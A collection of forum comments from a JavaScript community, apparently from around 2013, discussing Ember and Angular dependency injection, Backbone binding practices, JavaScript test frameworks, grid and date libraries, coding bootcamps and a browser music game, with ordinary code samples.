That specific instance is from Ember Data, which we recently brought up-to-date with the module/dependency injection improvements we've been making in the core framework. You can see an updated version of TodoMVC that uses the new idioms here: https://github.com/wycats/todomvc/blob/gh-pages/architecture-examples/emberjs/js/controllers/todos_controller.js#L16-L19
I looked at the Angular Todo examples, and they are pretty bad. They're not even using proper Routing in their app. &gt; One nice thing about Ember's DI system is that, because we're more opinionated about architecture, we give you the dependencies you are supposed to have. I'm sorry. I'm sure your fans will disagree with me, but in no way should a Dependency Injection container carry opinions about what code it will or won't inject dependencies into. A container should be completely decoupled from the code it's injecting into. The code shouldn't know about the container, and the container shouldn't know anything about the code. Anything else, is *bad* engineering. That being the case, how could such a container hold opinions about where it will inject dependencies? It couldn't. But a container that was poorly engineered could. Furthermore, a good DI structure in the code would mean that I should be able to inject the dependencies without a container at all. This is arguably also a shortcoming of Angular's container, IMO. In Angular you're required to use the container to inject the dependencies... it's still more decoupled from the code that what you're saying if it's true the container has opinions about where you should be allowed to inject dependencies. Maybe a few examples would help me understand. Perhaps I just don't see what you're touting here. EDIT: I respect that you're taking the time to discuss this, BTW. Very cool. Huge points with me (which I'm sure doesn't matter to you) but in my dealings with JS open source, there are a few players that aren't exactly gracious with the plebes. 
You don't have to isolate the scope. You can use the original scope, you can use a child scope (prototypically inherited from the original), you can completely isolate the scope, or you could even use the `compile` function and create your own custom scope from pretty much any object you wanted to (or an extended combination of objects). Child scoping is usually a better option over isolated scoping, but it's situational. At their heart, directives are nothing but a linking function for "here's a scope, here's an element... do something". In reality though, people write way too many directives. Most of the time you can do anything you'll need to do with the OOTB directives or extremely simple directive implementations.
&gt; I'm sorry. I'm sure your fans will disagree with me, but in no way should a Dependency Injection container carry opinions about what code it will or won't inject dependencies into. A container should be completely decoupled from the code it's injecting into. The code shouldn't know about the container, and the container shouldn't know anything about the code. Anything else, is bad engineering. Sorry if I wasn't clear. The container itself doesn't know anything about the application architecture. However, the `Ember.Route` class knows, for example, that it has access to controllers and the store. The `Ember.Controller` class knows that it has access to the store and its model. The class registers injections on the container so that the container knows what to give it when it is instantiated. This ends up being an extremely flexible system for both testing and extending internals in a well-structured way. &gt; Furthermore, a good DI structure in the code would mean that I should be able to inject the dependencies without a container at all. Like I said, you can unit test classes without the container. In the controller's case, you could do something like ``` var controller = App.PhotosController.create({ store: stubForStore() }); ``` 
So, let's say I take a very real-world scenario... like Facebook API integration. How would I inject functionality from those as dependencies into my controller? In Angular, I'd just wrap it in a service: var app = angular.module('myApp', []); app.factory('facebook', function($window, $q) { var fb = $window.FB; $window.fbAsyncInit = function () { fb.init({ appId: 'APPLICATION_ID_HERE', // App ID }); }; return { me: function () { var deferred = $q.defer(); fb.api('/me', function(data) { deferred.resolve(data); }); return deferred.promise; } }; }); Then reference it by name in the controller (or whatever) that used it. app.controller('FooCtrl', function($scope, facebook) { $scope.loadFacebookProfile = function () { facebook.me().then(function(data) { $scope.me = data; }); }; }); Where the view would be something like the following (assuming other required html elements present to load scripts, etc): &lt;div ng-controller="FooCtrl"&gt; &lt;button ng-click="loadFacebookProfile()"&gt;Load Facebook Profile&lt;/button&gt; &lt;pre&gt;{{me | json}}&lt;/pre&gt; &lt;/div&gt; Where if I wanted to create an instance of that controller for testing in any framework, it would be as simple as: var ctrl = $controller('FooCtrl', { $scope: someScope, facebook: someFacebookMock }); If I wanted to override that facebook service I made for feature switching, in my app I could register a new service by name returning a new object if I wanted. How do I do that in Ember? At the end of the day, maybe I just find Ember too confusing like [Rob Conery did](http://wekeroad.com/2013/03/06/ember-confuses-me). **All the best, again I really appreciate you taking the time to respond to my comments.** 
Care to elaborate on how you write a $.fn.onEnter function?
Great, I love looking at concrete examples. I think the most important thing here is that if you try to do a literal translation from Angular to Ember, it will feel very cumbersome. Round pegs and square holes, etc. That being said, here's how I'd do a similar thing in Ember. First, I'd define a FacebookService: App.FacebookService = Ember.Object.extend({ me: function() { var data = { username: "Shark_Kicker" }; return new Ember.RSVP.Promise(function(resolve) { setTimeout(function() { resolve(data); }, 1000); }); } }); Then, I'd: 1. Register the Facebook service with the container. 2. Tell the container that all controllers should get access to an instance of the Facebook service. Here's the code for that: App.register('service:facebook', App.FacebookService); App.inject('controller', 'facebook', 'service:facebook'); Then, in my controller, I'd do something like this: App.ApplicationController = Ember.Controller.extend({ actions: { loadProfile: function() { this.facebook.me().then(function(data) { this.set('username', data.username); }.bind(this)); } } }); If I wanted to test the controller, I'd stub or mock the Facebook service and just set the `facebook` property myself: var controller = App.ApplicationController.create({ facebook: someFacebookMock }); controller.send('loadProfile'); So, that being said, examples like this are necessarily somewhat contrived. I think more likely the way you'd model something like this is by implementing the `model` hook of the `ApplicationRoute`, if you wanted the Facebook data available before the template rendered. If you indeed wanted to wait until the user pressed a button to load the data, however, I think this is a good approach. Just to reiterate, I think the advantage of this approach is that you can't have views or models accessing the Facebook service. You're explicitly saying: "Only controllers have access to this object." Thanks again for getting into the details of this with me. I think there's nothing better than looking at code. Here are some JSBins of the above examples to play around with: http://jsbin.com/oYUGugE/1/edit (Implementation) http://jsbin.com/oqatalA/1/edit ("Unit Test")
&gt; Child scoping is usually a better option over isolated scoping, but it's situational. Can you give some info to back that up? On Friday I had a co-worker argue that directives with templates should only use an isolate scope. He argued loudly. For four hours.
Do you remember which commit it was? 
Note that the post is almost a year old, jQuery's `then` now returns a "filtered" promise, although I believe it still doesn't handle exceptions correctly. I'm not sure it handles returns from the errorHandler correctly either.
I'd be interested in hearing your thoughts about the alternatives. Thanks!
&gt; he argued loudly To me this is more than enough to ignore everything he said.
The short answer is that I'm a big fan of to-javascript compilation - tame.js, icedcoffeescript, toffeescript (on paper) - at least in instances where I don't find standard callbacks comfortable. On the client side I'm usually happy to use callbacks. On the server-side, now that we have sourcemaps, there is little reason not to take the productivity boost that come from these languages. Before my love affair with such things I ocassionally found caolan's async library quite handy. I've got three problems with promises... 1. Not all libraries support them (or support them consistently) which means I end up writing shims for things all the time. 2. Their use usually comes with a performance hit 3. They seem to increase how much code I write (even if only subtly) Edit: Why so many downvotes compared to replies? Was this comment not relevant to the conversation?
Aren't promise-like constructs trivial to implement on an ad hoc basis with the help of a state-maintaining closure? I like the way the following reads, and it's trivial to extend to support more than just the implicit if/else: this.validateForm().then({ onValid: this.submitForm, onInvalid: this.showFormErrors }); NOTE: I'll implement then() myself, thank you very much ;)
For some reason reddit has numbered my second question as 1 again?!
Thanks for the reply, if I understand correctly in the first bit of code, jQuery Backbone and Module1 will be retrieved from the sever on page load after optimisation has run (unless I set findNestedDepencies) instead of being included in 'bundle.js' 
Okay, Thanks! Second question was just asking, any major difference between using underscore's bind function to keep the context of the view, or to store the context in a variable named self. So in a click handler for the view I would either go (using _.bindAll ) &gt; this.model or (using var self = this ) &gt; self.model But I think you're correct, I can't see any reason why I wouldn't continue this way. I can't see it making a big difference. 
Couldn't watch video. Was too annoyed by their spelling of 'NATiVE'. Can't take this seriously.
I am quite surprised they did not compare SlickGrid in this article: https://github.com/mleibman/SlickGrid 500,000 rows w/ filtering: http://mleibman.github.io/SlickGrid/examples/example-optimizing-dataview.html
in fact the marketing is kind of kikoo. But the promise is great 
&gt; We do not support HTML &amp; CSS in favor of new things (NML and NSS, we will communicate on this later) then its not a "browser", just because you get your code via http, doesn't mean its a web browser. 
I have yet to see any other grid/table library that even comes close to SlickGrid in terms of performance. On top of supporting **millions** of rows, thousands of columns, virtual scrolling, filtering, multi-column sorting, column reordering/resizing, keyboard navigation, custom in-place editors &amp; formatters, grouping, aggregators, and additional plugin features; it is also free to use in commercial projects **and** is being actively maintained and updated. The author regularly responds to issues posted on the GitHub repo and frequently merges pull requests from the community. He is also an active Stack Overflow user.
regarding bindAll I typically put `_.bindAll(this)` into every view's `initialize` instead of enumerating every method that needs it. Saves the trouble of having to change 2 places whenever I add/remove/rename a method. I don't see how you would be able to use `var self; self = this;` to replace what `_.bindAll` does. Where are you putting `self`, and how are you passing it to the other methods? edit: apparently you only have to write `_.bindAll()` e.g. initialize : function () { _.bindAll(); },
Well, in most cases directives exist to support some aspect of your current view. If you isolate the scope, you essentially remove access to the data aspects of that current view. If you create a child scope, then you can read values from your parent scope without having to use $parent (which is hackish), thanks to prototypical inheritance. Even better if you set a property on a child scope it's not going to set it in the parent, so you get a form of isolation, and probably all of the isolation you need. Also, don't let coworkers yell at you, or even take my word for anything. Explore, research, and make the right decisions for yourself.
_.bindAll(this) on a Backbone View will wrap **every** function on that View--every single Backbone View function. It works, but it's sloppy. I prefer at least enumerating the functions I wish to be bound, as OP does: _.bindAll(this, "findThing", "doOther", "manyThings");
Generally you need _.bindAll for event triggers. It can be shorter to do that binding when you actually bind the event, as in: this.model.bind("change:prop", this.render, this); The third parameter sets the context. I tend to alternate between the two--sometimes _.bindAll and sometimes setting it when binding the Backbone Event. (Note that functions called due to DOM events (that is, those set in the events object on the View) are _automatically_ bound to the View's context.)
Great, thanks for the example. I'm happy to have a test example of testing a controller. Every Ember app I've inherited has been essentially untested, and none of them used the DI container at all. I guess I wish that the `App.register` and `App.inject` parts were not optional. Other than that, it's pretty much what I'd already seen. The question to answer, I'd say, is why have I never seen an Ember app until just now that was actually using the DI container? Is it perhaps the examples that exist? Oh well. I appreciate your patience and your comments. Thanks again.
I don't really see the point of this.
Binding every function is exactly the point. Sure it might be slower, but only by around [0.000013 seconds per object](http://jsperf.com/underscore-bindall-this-vs-bindall-this-params). You'll only notice a ~100ms difference when you need to initialize 8000 views at the same time, at which point you have a totally different problem. Take a look at this [sample View from Addy Osmani's Backbone Fundamentals] (https://github.com/addyosmani/backbone-fundamentals/blob/gh-pages/practicals/todo-jqm-app/app/modules/view/abstract/BasicView.js?source=cc) Imagine having to keep track of which methods need to be bound and enumerated, and every time you remove or rename a method you have to scroll up to change the parameter of `bindAll` otherwise you'll get an error and the code won't run, but only if it was an enumerated and bound method. Now imagine doing that for **every view** your application has. That is too much mental overhead.
If you use `this.model.bind` (for those newer to Backbone, `Model.bind` was renamed to `Model.on` in Backbone 0.9.0 but was kept as an alias), make sure you remember to call `this.model.off` (or `this.model.unbind`) when you're removing the view, otherwise the model will keep a reference to it and it won't get garbage-collected. It's unfortunate that `listenTo` doesn't have an optional context parameter. I suppose you could do this.listenTo(this.model, 'change:prop', _.bind(this.render, this)); But that seems slightly less elegant than just sticking `_.bindAll()` into the view's `initialize`
In regards to how you would use var self; self = this; I read this code snippet &gt; define(['jquery', 'use!backbone','models/model'], function($, Backbone, Model){ &gt; &gt; var self, &gt; &gt; View = Backbone.View.extend({ &gt; &gt; // Represents the actual DOM element that corresponds to your View (There is a one to one relationship between View Objects and DOM elements) &gt; el: 'body', &gt; &gt; // View constructor &gt; initialize: function() { &gt; &gt; // Storing the View context &gt; self = this; &gt; &gt; // Setting the View's model property to the passed in Model &gt; this.model = new Model({ &gt; message: "You are now using Backbone, Require, and jQuery!" &gt; }); &gt; &gt; }, &gt; &gt; events: { &gt; "click #example": "promptUser" &gt; }, &gt; &gt; render: function() { &gt; &gt; // Updates the text of the element with an ID attribute of example &gt; self.$el.find("#example").text("This is an example"); &gt; &gt; }, &gt; &gt; promptUser: function() { &gt; prompt("Isn't this amazing?", "Yes, yes it is"); &gt; } &gt; &gt; }); &gt; &gt; // Returns the entire view (allows you to reuse your View class in a different module) &gt; return new View(); &gt; }); from here: [http://gregfranko.com/blog/using-backbone-dot-js-with-require-dot-js/](http://gregfranko.com/blog/using-backbone-dot-js-with-require-dot-js/)
Thanks for the info. Think I'll be switching to _.bindAll(); 
I am using model.bind, as I started writing this before 0.9. All my views have a close method, ran into the zombie problem a good while ago. 
How is this better/different from node-webkit: https://github.com/rogerwang/node-webkit ? Presumably because "it comes with the key functionality required in developing cross-platform desktop apps: a build process." But that process does not seem especially onerous when it comes to node-webkit.
Much as I like this, it's not *exactly* Desktop ready if you need to install several developer-centric dependencies as a user. I hope it paves the way though, it would rock to have that. **Update:** ohkay, I misunderstood, those are the developer parts.
In the first example, RequireJS will load your module, detect the synchronous requires, parse them out and replace them with async equivalents, and then eval() the result. A bit trickier to debug because it's doing some source transformation, and when you place a breakpoint, you're in the eval'ed (program) space. A shame, because the syntax is cleaner, adding more deps is easier, and not dependent on the order of arguments in 2 places. The second will just do the async dependency management as you'd expect, but gets more and more verbose and cumbersome as you add more dependencies. Honestly, this is why I like the CommonJS/Browserify module style over AMD/r.js. Less boilerplate, and the end result is very similar.
You don't, as a user. Users just install the installer that brackets generates. The "developer-centric dependencies" are if you are developer. Is that non-obvious given the text of the post?
It's safe to say that there *may be overlap* between the two projects. What you get with brackets-shell is an extremely automated deployment process, CES and simple native functionality (eg open a file dialog, set up native system menus, etc).
You're right, I read too fast and mis-interpreted. On a second reading it does look interesting, to say the least.
It hadn't occurred to me that using RequireJS (or any module system) would let you do that until now, thanks for the link! It's certainly not a Backbone standard practice since it requires each 'var self' to be in its own clojure, which would be much more bothersome to work with if it weren't for each AMD module already being in its own clojure. Correct me if I'm wrong, but there does seem to be a rather significant limitation - you won't be able to create two instances of the same base View with this method. i.e. You'll always have to `return new View()` and can't `return View`. ergo you won't be able to do this: var BaseView = Backbone.View.extend({/* stuff */}), viewOne = new BaseView({configurations}), viewTwo = new BaseView({differentConfigurations}); viewOne and viewTwo would share the same variable `self`, and viewTwo's constructor would have overwritten viewOne's `self` to point to "viewTwo". 
Probably better to make a new thread asking for feedback. This is pretty buried and basically nobody's seeing it. Personally, I like it in needs.
There is some point at which _.bindAll() is what makes a Class instead of an Object; at which we can see that _.bindAll() is built into other languages. &gt;Imagine having to keep track of which methods need to be bound and enumerated, and every time you remove or rename a method you have to scroll up to change the parameter of bindAll otherwise you'll get an error and the code won't run Well yes; I've regarded that as a sanity check, and also as a means of knowing _exactly_ what I'm doing when binding. Something about discipline and paying attention, I guess. Like I said, I just find it sloppy even if that makes me a grumbling old fart. 
I used this daily when I rewrote espn gamecast. Very helpful for getting the most out of your code.
Side note; I understand the desire to move away from Events.bind to .on because of _.bind, but .on and .off don't cut it for me, semantically. I'm not turning events on and off, I'm _binding_ them and releasing them. 
http://discuss.emberjs.com/t/improvements-to-the-di-subsystem/2378
It's a "browser" in a sense that you browse pages. Browse using hyperlinks. Navigate into a "website" by reaching a URL through HTTP. It uses "standard" APIs such as 2D context (canvas), webgl, and so forth. DOM is the missing part (replaced by another paradigm). Current browsers only support HTML. IMHO, trying a new paradigm is worth a try. 
Not to be confused with [Yapp.us](https://www.yapp.us/), whose team have been contributing quite a bit to Ember.js
It is worth exploring node-webkit because it is being made specifically for this purpose and ability to integrate nodejs modules seamlessly makes it very interesting
I was about to say this is more suitable to the /r/programming subreddit, but nope; this school is all javascript. 11 hour days, 6/7 days, for 3 months -- falling behind even a little (various emergencies) could be brutal.
Date.js is pretty much dead. There hasn't been any development for 5 years.
$17,000 .. is pretty steep the most expensive of ANY bootcamp program in the world at the moment.. i wont how they justify that...
Interesting! Is there a place where I can find more on this?
I haven't tried it with Ember specifically, but lodash has a compatibility build that should make it a complete drop in replacement for underscore. I would just try it out, and if you run into a weird bug see if switching out for underscore.js fixes it.
moment.js is definitely the go-to library for any date and time related operations
I can see that. Semantically it does make more sense, but there are worse examples of method naming. I wouldn't get hung up on it. 
I'm currently in a dev bootcamp.. They boast the same stats as everyone else Which is why I was wondering what their angle is Most of these programs including the one I'm currently in are all pretty much run the same or very similar ... and alot of the same things are being taught ... I dunno 17000 seems steep ESP when the pioneer of the dev schools www.devbootcamp.com is only 12k and there are free www.appacademy.io and deferment plans abound it's like thy are trying to elitist bit In price only....what else do you get???
visit and see for yourself since actions speak louder than words. 944 Market Street, 8th Floor San Francisco, CA 94103
So basically this is just another sandbox to work in? Like QT aims to consolidate all native platforms NiDIUM is trying to do that but just not being a browser and sticking to JS as the way to program it? How is this different from just not using the DOM? Or [node-webkit](https://github.com/rogerwang/node-webkit)?
Lolll that's quite funny. I don't care how much money they make after they leave, their knowledge isn't rooted in fundamentals, and is microscopic, at best. And making javascript lolapps at some "bootcamp" isn't even in the same GALAXY as a Computer Science degree.
D3 is really sexy stuff and easy to get something cool out of. Anyone who reads this and has an afternoon or weekend to kill and feels like a bit of freestyle javascripting should definitely mess around with this. And a bonus: after you are done and have made something you can even show it to non-coders and impress them with sweet graphics. Double points if it is interactive and animates itself.
&gt; it is also free to use in commercial projects
In addition the documentation is somewhat confusing and unfinished. I used it for a large project a year or two ago and while it worked OK - I have found XDate to be a very good replacement. 
yes, a supercomputer built in Javascript is an "lolapps" http://www.wired.com/wiredenterprise/2013/06/43651/ we even have students contribute to popular open-source repos that you probably use such as CoffeeScript, Angular, Bootstrap, Yeoman, and more. What have you built lately in Javascript? Going to a UC school can cost upwards of $120k, and attending a CSU can easily cost $80,000 in 4 years. The other track is attending Hack Reactor $17k in 3 months then 4 years of REAL experience.
Are you involved with Webix and/or DataTable?
I was referring to Ender, not Ember
A lobotomized monkey can contribute to an open-source project. Just raise an issue and you're technically a contributor, or do a little edit; i'm not impressed. I'm not arguing the financials; they make sense. And the fact that they make that much to start off with tells me a couple things: 1. Silicon Valley 2. Connections. Either way, it's an unrealistic scheme that has a few dependencies such as location. But my main point, that you didn't address, is that it's not a replacement for a compsci degree. A computer scientist can go on and program in any computer programming environment he pleases; language doesn't matter for him because that's just a detail in the process. *Your* graduates can only markup webpages and use javascript. What happens when one day the web changes drastically? SCREWED. Also, i remember a time on reddit when it was taboo to post your own content. Boo this man! 
You need to use two different techniques, first show a hidden div with jQuery function slideDown Then you can scroll to top easily with a jQuery animation like this $('html, body').animate({scrollTop:0}, 10, 'linear'); My advice is to use stackoverflow for getting answer to your question, reddit is more an opinion website
Yep, here SlickGrid wins
I know you asked this a while ago but for posterity sake I'll give you an example while being explicit can be important. Imagine you have some piece of code function foo () { // a bunch of code function iterateCount () { return 1 + count; // 'count' is not defined in either iterateCount or foo, so it will look in the global scope for it and create it there if necessary } } Say your code is counting on `count` to be a global variable. The some newbie developer comes along to fix some bug function foo () { // a bunch of code for (var count = 0; count &lt; aVar.length; count++) { // ... } // a bunch of code function iterateCount () { return 1 + count; } } Since JavaScript doesn't have block scope (yet) this code exactly the same as writing: function foo () { var count = undefined; // a bunch of code for (count = 0; count &lt; aVar.length; count++) { // ... } // a bunch of code function iterateCount () { return 1 + count; // "count" was found the in the "foo" function scope, use that. } } So now the code in iterateCount which used to use a global variable named count is getting clobbered by the more specific scope assignment. To avoid that you could explicitly use `window` to ensure you're using the proper name space for where you expect count to be function foo () { var count = undefined; // a bunch of code for (count = 0; count &lt; aVar.length; count++) { // ... } // a bunch of code function iterateCount () { return 1 + window.count; } } You shouldn't be using global variables to begin with so this is a poor example of code for real world use but that's a different argument. 
man, I wish there was a dev bootcamp where I live (Phoenix). I'm intrigued by the format of these because going back to college doesn't seem like the best route to take where I am at in life. But the cost, plus living expenses in a new city, plus paying for my wife and kids to stay at home are too much. I don't know how people do it unless they already have a high paying job.
It feels like I'm going blind.
I have read both and there are tons of extra material in the book
That makes me feel a little better. It's not that I mind having free online versions of books available; in fact I don't mind at all. It's just that this is the fourth programming book I've purchased only to find an online version later. You think I would have learned by now!
What specific limitations are you running into and what customizations have you created to solve the pain of those limitations? In order to truly help you with some recommendations it would help to have some specific details :)
1 minute into reading I come across this "Because computers are binary systems, everything is either on or off, yes or no, this or that, there or not there. Humans are mushier, softer creatures, and the computers are not willing to meet us halfway—we must go to them." And I wept for the fall of mankind. (The brain is also binary..)
Well, writing a book is a considerable amount of work. So buying the book even if there's an online version available is a good way to say "thank you" to the author.
Oh yeah, I should have mentioned that, just didn't want a giant wall of text :) The main bits I had to hack in: 1. ability to abort test after first assertion failure. 2. catch (and log as test failures) any errors thrown during callbacks such passed as to setTimeout or addEventListener -- current qunit code doesn't notice and/or clean up correctly. 3. richer assertion tests, and ability to create custom assertion tests which display custom fields containing assertion-specific failure information. 4. ability to skip certain tests based on setup criteria (mainly browser capabilities), and have them logged as "skipped" instead of "pass" or "fail" -- haven't implemented this one, or need to, but I'd sorta like it. \# 3 was the one that required the most changes. I'm coming from a python background, and wanted to use the wide array of [assertions](http://docs.python.org/2/library/unittest.html#test-cases) it's unittest module offers. I started to hack in a bunch of 'em, such as assert.regexMatch(), assert.inArray(), assert.itemsEqual(), but soon realized that QUnit.push() had certain expectations about it's arguments that didn't quite fit. Furthermore, I wanted to create some application-specific assertion tests, with custom fields in the failure data, and all that together ended up with a bunch of refactoring of QUnit.push(), assert.ok(), and some other QUnit internals. Don't get me wrong, I really like QUnit. But that's when I realized I was about to get rather invested in the framework, and wanted to make sure it was the right path to go. 
I've had good experience using both [Jasmine](http://pivotal.github.io/jasmine/) and [Mocha](http://visionmedia.github.io/mocha/), with a preference for the former due to the many extensions and tools I've grown fond of. Given your familiarity with QUnit which uses xUnit style assertion mechanisms you may be more at home with Mocha and its standard "TDD" style interface: &gt; The "TDD" interface provides suite(), test(), setup(), and teardown(). If you aren't tied to classic TDD semantics, I've found the BDD style semantics ("describe", "it", etc..) available in both Jasmine and Mocha to be a refreshingly simple way to describe test problems. Regardless of what style you pick I find it helpful to stage my tests in terms of three discreet steps: "arrange, act, assert" (or, their close cousins "given", "when", "then"). Both Mocha and Jasmine support isolating specs via `describe.only` and `it.only`; when using Jasmine you'll need to add a small plugin to achieve this called [jasmine-only](https://github.com/davemo/jasmine-only). Assertion customization in Mocha and Jasmine is pretty easy, and you can craft custom matchers to improve the semantics of your tests to better align the readability with your systems domain. Mocha allows you to do this with a standalone BDD style assertion library called [Chai](http://chaijs.com/), while Jasmine simply has facilities for writing [Custom Matchers](https://github.com/pivotal/jasmine/wiki/Matchers) Given my preference has been Jasmine due to a number of tools I mentioned above, I figured it would be worth your time to compare both Mocha and Jasmines plugin ecosystem to help you evaluate things; here are some of my favorite Jasmine plugins: * [Jasmine-Given](https://github.com/searls/jasmine-given) * [Jasmine-Stealth](https://github.com/searls/jasmine-stealth) * [Jasmine-Fixture](https://github.com/searls/jasmine-fixture) * [Jasmine-Only](https://github.com/davemo/jasmine-only) Regarding #1, ~~I can't think of anything in Jasmine or Mocha that would allow you to abort early~~ As aeflash described above you can achieve this with the `--bail` flag or `this.bail(true)` in a suite (but I'm not sure I would want that type of behaviour to be honest); having spec exclusivity helpers like `describe.only` and `it.only` can help eliminate the pain of a massive pile of red specs, and help isolate whether your test is failing as a result of test pollution or some other collaborator to the unit under test. Regarding #2, I think you could probably achieve this by wrapping native DOM apis you use in your code and introducing some sort of injectable logger that has a log level mode which you can flip on for more verbose stack traces in your tests. I'm not sure I would want any of this type of logic as part of my test framework as my gut feeling is that it would significantly complicate the test environment. Hope that gives you some reading to dive into, let me know if you have any other questions :) **Edit**: I forgot to add a screencast link, this [Jasmine-Tactics Screencast](http://searls.testdouble.com/posts/2013-03-21-jasmine-tactics-screencast.html) is a great source of information and features many of the plugins I posted above. It's lengthy, but worth a watch when considering a framework to evaluate; it also has some good testing-fu that developers who are unit-testing JavaScript will find valuable :)
[mocha](http://visionmedia.github.io/mocha/) really fits the bill for what you want. 1. The `--bail` CLI flag will cause it to abort after the first failure. You can also call `this.bail(true)` in a `describe()` suite to enable it 2. Mocha supports async tests. If you pass a callback to the test `it("should do something async", function (done) {... done();})` and can capture all errors using the global error handler 3. Since mocha works by exceptions you can create a custom fail message just by doing `if (failCondition) { throw new Error("my custom message");}` 4. Mocha has a `--grep` option for filtering tests by their title for any given run. Because it works through exceptions, you can use any number of assertion libraries, `expect.js`, `chai`, `should`, `require("assert")` etc...
Thanks xtr3m! I got the answer by myself but I guess my logic was just off. I think the key words there are that the condition runs until it is false, so it is like it needs to run one more time than is expected beyond the simple mathematics, or at least in my mind that is how it works.
Thanks everyone, awesome explanations and that cleared it up!!
Wow, thanks for the detailed response! I haven't had much experience with BDD style testing, but the intro page for Jasmine looked *really* flexible, and might be a better fit for the tests I've been writing... looks like it already has most of the assertions I'm used to, just under different names. I'll have to look into both of those. 
Had to turn my sensitivity all the way up in order to have any chance in hell, I suggest either turning it up in-game, or giving a sensitivity option.
Anyone know why you might go for this over backbone or maybe backbone.marionette ?
There are two popular methods of setting up inheritance for "classes" in JS. Functional: var makeCar = function(speed) { var car = {}; car.speed = speed; car.position = 0; car.move = function() { this.position += this.speed; }; return car; }; var car = makeCar(10); Pseudo-Classical: var Car = function(speed) { this.speed = speed; this.position = 0; }; Car.prototype.move = function() { this.position += this.speed; }; var car = new Car(10); The new keyword does runs the function in constructor mode which does the following: * implicitly creates a new object * binds the keyword this to that object within the function * sets up a prototype chain to Name.prototype (in this case Car) * implicitly returns the object Most workplaces will take pseudo-classical instantiation as their standard as it is more concise. The only main benefits of using the prototypal inheritence over the functional model are that you only have to define the method once and that changing the method of the prototype will propogate the change down to objects instantiated beforehand (which could be a good or bad thing.) Downsides are people new to JS may misunderstand how to use the keyword this or forget to use keyword new when instantiating. PS: You're missing some semi-colons on the end of those fn decs :)
No, the brain is not in any reasonable definition binary. You can sort of argue that neurons are binary, in that they can be excited and not excited; that only covers one aspect of neurons, and don't take into account connections between neurons, nor the "memory" of neurons from recent events (chemical composition will be different, and this influence e.g. the changes in synaptic strength), nor any other aspect of the neuron being complicated. It also completely ignores the abstraction that is built on top of the neurons - one that's based for the most part on fuzzy recognition of patterns, as opposed to the discrete math that digital computers are mostly based on.
Yes, definitely explore both options; it's worth investing time into seeing what works best for you and your team :)
Feels and looks smooth, and is pretty fun too. However, one point, with all the stacking semi-transparent walls and the effects it's quite hard to see which way you are supposed to go sometimes. This gets a little annoying when all you want to do is hear the full song.
This is nice. One ~~thumbs~~internetz for you. edit: forgot I was on reddit.
You may be interested in the examples that I've posted here: https://github.com/joelbirchler/js-fundamentals/tree/master/oop I've been particularly happy with the backbone/underscore extend pattern. https://github.com/jimmydo/js-toolbox/blob/master/toolbox.js and https://github.com/joelbirchler/js-fundamentals/blob/master/oop/extend.js Could you clarify what you mean by "setting up functions for every new object"? 
&gt;grumbling old fart Quite the visual + auditory + olfactory image that statement renders.
I'm pretty sure he means that in the functional pattern, since function definitions are inside the scope of the constructor, new functions are created on each call to the constructor. This leads to extra instantiation time and use of memory. This is not true in the classical pattern since methods are tied to the prototype chain and all instances of the class use the same methods.
Just enter up-up-down-down-left-right-left-right-b-a and then click this link: https://soundcloud.com/dutoncmusic/du-tonc-surging-memories
So you're telling me if I learn javascript I can create something similar to this?
Thanks for the links, I'll check them out tomorrow when I'm not on my phone. To answer you question, when you use classical inheritance (with prototypes) the functions (methods) are only created once and the reused for each instantiation. For the crockford model (forget what he calls it) the functions need to be recreated in the closure each time. It has been shown this is comparatively very, very slow. 
Is this Chrome only? Don't see anything (after it gets black) on Firefox. 
Works fine for me on 23.0.1
I had the same issue. Hard to tell where the hole is in the next forcefield when the one after it is visible through the hole and looks almost identical.
Some of those examples, such as mathy and highGreeter, are curried functions. Currying comes up a lot in functional programming and is particularly useful for partial application. As you say, in javascript code partial application is more commonly achieved using .bind() or with wrapping functions that concatenate argument lists. But if a function is specifically intended to be partially applied then currying might be nicer since callers would not have to use wrappers to create intermediate applications. By the way, if you use Fay to transpile Haskell code to javascript you get a lot of curried functions. In that world you can assume that every function can be partially applied, which turns out to be convenient. There might be other compile-to-javascript languages that do the same thing.
There's also tint: www.trueinteractions.com
Nothing on Firefox 24 Beta, MacOS X 10.8. 
Would be nice to see the original source. Cool game though!
It never stops loading for me. I'm only seeing the gray/black wireframe screen, and it keeps saying the following every five seconds in the console: PxLoader elapsed: 52 sec PxLoader: #10 assets/sound/music (Waiting) PxLoader: #11 assets/sound/gui (Waiting) Is there any mirrors that work?
lol something like that... im in a dev bootcamp and this is the 6th week and i cant even fathon creating something like this... i spent all weekend working on tetris (still unfinished)
I would guess a possible reason it's not used much is there isn't a lot of documentation for it, and the benefit only comes out in bigger, tested apps, so it's not something you realize you need until you see it. An aside: this thread has been very informative for me, so thanks for your / everyone's posts.
Ah! Yes, of course. Sorry. My mind went to a _manual_ setup of functions each go and I couldn't picture what you were doing. :)
Looks well built and well designed, but I don't enjoy playing it because it's impossible to tell where you're supposed to go. The barricades are unclear, especially when several are behind each other. It would help if they were different colors.
The system supports WebGL. Even the Citadel Demo. And of course get.webgl.org
I think this is a great idea for JS games in general but it seems a bit big for JS13k (assuming song + player are still around 2.8k). This JS1K demo seems to have a smaller footprint (and there have been others including Tetris with music). http://js1k.com/2013-spring/demo/1518
It's actually more fun with the leap controller, that's nice. I just wish it was both easier to determine the way, and faster.
i personally have a little bit of a problem with all the existing date libraries out there. they either wrap the javascript date object or extend it. I would like a more functional approach, where you have your functions like format, parse, add, substract or isToday and thei take the (normal javascript) date object as a parameter. I started a little library a while ago that embraces this more functional style, but i abandoned it (mostly due to the fact, that i accepted momentjs in my current project). this is it: https://github.com/sra448/tic/blob/master/spec/ticSpec.js. is there any demand for a project like this?
Yeah, sure.
Javascript is one piece to the puzzle here. You also need to familiarize yourself with the OpenGL API and 3D programming concepts.
Me too, I ended up disabling the gates. Turns it into a sort of interactive music video. HOWTO - Open web developer tools console, enter this: HELLORUN.Game.prototype.onGate = function() { } 
Do none of these apps have screen shots or examples?
so...not well designed then?
That might even be too basic for /r/learnjavascript 
That's cool. Thanks for that. If the game is that accessible in the console, it may be possible to just program in a quick auto-pilot as well for a skilful looking replay :]
He should probably advertise that =)
Yeah you'd think a "gallery" would have something to look at.
Off topic but this is one of the nicest purple site I've seen.
I didn't sign up because I get the impression that I'm going to be spammed. I don't know whether or not that's actually true, but that's why I didn't sign up. This is why you should offer free demos. I'm not going to sign up for this until I'm able to try it and see that I like it.
I agree! That came to my mind when I saw it 
So my next question is, what's the benefit of using bower for example, to download packages or libraries versus downloading them manually? Pardon me if I sound stupid.
two reasons - you can keep those dependencies all up to date automatically, and when you release your thing then anyone else who downloads it can automatically download all it's dependencies through bower/npm
